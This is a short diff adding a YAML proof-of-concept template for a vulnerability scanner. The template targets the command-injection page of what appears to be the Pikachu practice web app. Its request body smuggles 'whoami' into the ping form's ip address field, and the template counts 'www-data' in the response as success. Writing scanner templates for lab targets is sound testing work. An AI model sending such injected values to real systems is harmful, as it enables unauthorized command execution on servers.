@@ -1,0 +1,12 @@
+!!com.pocscanner.core.model.POCConfig
+author: ''
+description: ''
+level: 高
+name: pikachu rce
+request: {body: ipaddress=127.0.0.1++%26+whoami&submit=ping, headers: null, method: POST,
+  params: null, path: /vul/rce/rce_ping.php}
+response:
+  errorIndicators: null
+  matchType: contains
+  statusCode: null
+  successIndicators: [www-data]
